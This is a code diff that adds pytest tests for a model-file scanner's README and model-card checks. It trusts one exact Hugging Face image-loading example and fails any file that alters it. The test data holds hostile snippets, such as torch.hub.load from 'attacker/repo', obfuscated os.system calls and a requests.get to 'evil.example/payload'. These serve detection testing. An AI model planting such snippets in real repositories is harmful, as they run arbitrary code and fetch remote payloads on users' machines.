@@ -1,3 +1,4 @@
+import hashlib
 import json
 from pathlib import Path
 from typing import Any
@@ -25,6 +26,176 @@ def _failed_network_detection_checks(result: Any) -> list[Any]:
         for check in result.checks
         if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
     ]
+
+
+HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE = (
+    "# Model usage\n\n"
+    "```python\n"
+    "from urllib.request import urlopen\n"
+    "from PIL import Image\n"
+    "img = Image.open(urlopen(\n"
+    '    "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/'
+    'beignets-task-guide.png"\n'
+    "))\n"
+    "```\n"
+)
+
+
+def _trust_exact_huggingface_documentation_example(
+    monkeypatch: pytest.MonkeyPatch,
+) -> bytes:
+    payload = HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE.encode()
+    monkeypatch.setattr(
+        text_scanner_module,
+        "VERIFIED_HUGGINGFACE_DOCUMENTATION_IMAGE_READMES",
+        frozenset({(len(payload), hashlib.sha256(payload).hexdigest())}),
+    )
+    return payload
+
+
+@pytest.mark.parametrize(
+    "filename",
+    ["README.md", "README.markdown", "README.en.md", "model_card.md", "modelcard.markdown"],
+)
+def test_text_scanner_verified_huggingface_image_documentation_is_informational(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    filename: str,
+) -> None:
+    payload = _trust_exact_huggingface_documentation_example(monkeypatch)
+    text_path = tmp_path / filename
+    text_path.write_bytes(payload)
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection"
+        and (check.details.get("function") == "urlopen" or check.details.get("library") == "urllib")
+    ]
+
+    assert {check.details.get("type") for check in network_checks} == {"network_function", "network_library"}
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert result.success is True
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "attack",
+    [
+        pytest.param(
+            "```python\nimport torch\ntorch.hub.load('attacker/repo', 'payload', trust_repo=True)\n```\n",
+            id="fenced-hub-load",
+        ),
+        pytest.param(
+            "```python\nfrom torch.hub import load as fetch\nfetch('attacker/repo', 'payload', trust_repo=True)\n```\n",
+            id="aliased-hub-load",
+        ),
+        pytest.param(
+            "    @__import__('os').system('id')\n    def activate():\n        pass\n",
+            id="unfenced-executable-decorator",
+        ),
+        pytest.param(
+            "    (__import__\n    ('os')\n    .system\n    ('id'))\n",
+            id="multiline-unfenced-execution",
+        ),
+        pytest.param(
+            "    (print := eval)\n    print(\"__import__('os').system('id')\")\n",
+            id="protected-callable-rebinding",
+        ),
+        pytest.param(
+            "```bash\nenv python -c \"__import__('os').system('id')\"\n```\n",
+            id="wrapped-shell-execution",
+        ),
+        pytest.param(
+            '```bash\n"python" "-c" "__import__(\'os\').system(\'id\')"\n```\n',
+            id="quoted-shell-execution",
+        ),
+        pytest.param(
+            "```bibtex\n@misc{x}\ntrue && python -c \"__import__('os').system('id')\"\n{}\n```\n",
+            id="forged-bibliography",
+        ),
+        pytest.param(
+            "~~~python\nimport torch\ntorch.hub.load('attacker/repo', 'payload')\n~~~\n",
+            id="tilde-fenced-hub-load",
+        ),
+        pytest.param(
+            "> ```python\n> import torch\n> torch.hub.load('attacker/repo', 'payload')\n> ```\n",
+            id="blockquote-hub-load",
+        ),
+        pytest.param(
+            "<pre><code>\nimport torch\ntorch.hub.load('attacker/repo', 'payload')\n</code></pre>\n",
+            id="html-wrapped-hub-load",
+        ),
+        pytest.param(
+            "```python\nimport requests\nrequests.get('https://evil.example/payload')\n```\n",
+            id="unrelated-requests-network-call",
+        ),
+    ],
+)
+@pytest.mark.parametrize("prepend", [False, True], ids=["appended", "prepended"])
+def test_text_scanner_modified_huggingface_image_documentation_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    attack: str,
+    prepend: bool,
+) -> None:
+    trusted_payload = _trust_exact_huggingface_documentation_example(monkeypatch)
+    attack_payload = attack.encode()
+    payload = attack_payload + trusted_payload if prepend else trusted_payload + attack_payload
+    text_path = tmp_path / "README.md"
+    text_path.write_bytes(payload)
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert hashlib.sha256(payload).digest() != hashlib.sha256(trusted_payload).digest()
+    assert result.success is False
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_same_length_modified_huggingface_image_documentation_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    trusted_payload = _trust_exact_huggingface_documentation_example(monkeypatch)
+    payload = trusted_payload.replace(b"img = Image.open", b"out = Image.open", 1)
+    text_path = tmp_path / "README.md"
+    text_path.write_bytes(payload)
+
+    result = TextScanner().scan(str(text_path))
+
+    assert len(payload) == len(trusted_payload)
+    assert hashlib.sha256(payload).digest() != hashlib.sha256(trusted_payload).digest()
+    assert result.success is False
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+@pytest.mark.parametrize("filename", ["README", "README.rst", "README.txt", "model_card.rst", "vocab.txt"])
+def test_text_scanner_verified_huggingface_image_digest_does_not_weaken_non_markdown_files(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    filename: str,
+) -> None:
+    payload = _trust_exact_huggingface_documentation_example(monkeypatch)
+    text_path = tmp_path / filename
+    text_path.write_bytes(payload)
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    )
 
 
 def test_text_scanner_handles_routable_vocabulary_file(tmp_path: Path) -> None:
